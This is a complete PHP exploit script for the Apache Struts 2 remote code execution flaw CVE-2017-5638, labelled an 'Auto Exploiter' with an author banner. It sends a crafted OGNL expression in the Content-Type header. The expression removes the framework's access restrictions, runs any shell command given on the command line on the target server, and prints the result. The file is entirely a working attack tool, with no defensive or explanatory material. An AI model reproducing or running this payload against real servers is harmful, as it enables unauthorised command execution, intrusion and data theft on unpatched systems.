<?php
function exploit($url, $cmd) {
	$payload = "%{(#_='multipart/form-data').";
	$payload .= "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).";
	$payload .= "(#_memberAccess?";
	$payload .= "(#_memberAccess=#dm):";
	$payload .= "((#container=#context['com.opensymphony.xwork2.ActionContext.container']).";
	$payload .= "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).";
	$payload .= "(#ognlUtil.getExcludedPackageNames().clear()).";
	$payload .= "(#ognlUtil.getExcludedClasses().clear()).";
	$payload .= "(#context.setMemberAccess(#dm)))).";
	$payload .= "(#cmd='".$cmd."').";
	$payload .= "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).";
	$payload .= "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).";
	$payload .= "(#p=new java.lang.ProcessBuilder(#cmds)).";
	$payload .= "(#p.redirectErrorStream(true)).(#process=#p.start()).";
	$payload .= "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).";
	$payload .= "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).";
	$payload .= "(#ros.flush())}";
	$req = curl_init($url);
	curl_setopt($req, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($req, CURLOPT_HTTPHEADER, array("Connection: close","User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0","Accept: */*","Content-Type: ".$payload.""));
	$result = curl_exec($req);
	$result = htmlspecialchars($result, ENT_QUOTES, "UTF-8");
	echo $result;

	return curl_close($req);
}

$welcome = "=======================================================\n";
$welcome .= "# CVE-2017-5638\n";
$welcome .= "# Apache Struts 2 Vulnerability Remote Code Execution\n";
$welcome .= "# Auto Exploiter V 1.0\n";
$welcome .= "# Author: N07HY\n";
$welcome .= "# Website: http://www.oktavianto.id/\n";
$welcome .= "# Github: https://github.com/oktavianto\n";
$welcome .= "=======================================================";
echo $welcome."\n\n";
echo "Target URL : ".$argv[1]."\n";
echo "Command    : ".$argv[2]."\n\n";
echo "Result:\n";
exploit($argv[1], $argv[2]);
?>
